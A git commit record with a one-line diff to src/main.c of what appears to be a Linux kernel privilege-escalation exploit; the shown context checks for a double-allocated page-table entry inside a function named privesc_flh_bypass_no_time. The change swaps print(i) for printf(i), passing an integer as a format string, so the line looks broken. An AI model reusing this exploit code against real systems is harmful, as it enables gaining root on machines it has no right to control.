1ac24ef5a2138dc1e32462758ce446c217f9b7a0
Willenst <willenst@gmail.com>
2024-11-26 17:16:41 +0200

    1

--- src/main.c
+++ src/main.c
@@ -362,7 +362,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
 		{
-			print(i);
+			printf(i);
 			printf("[+] confirmed double alloc PMD/PTE\n");
 			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
 			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
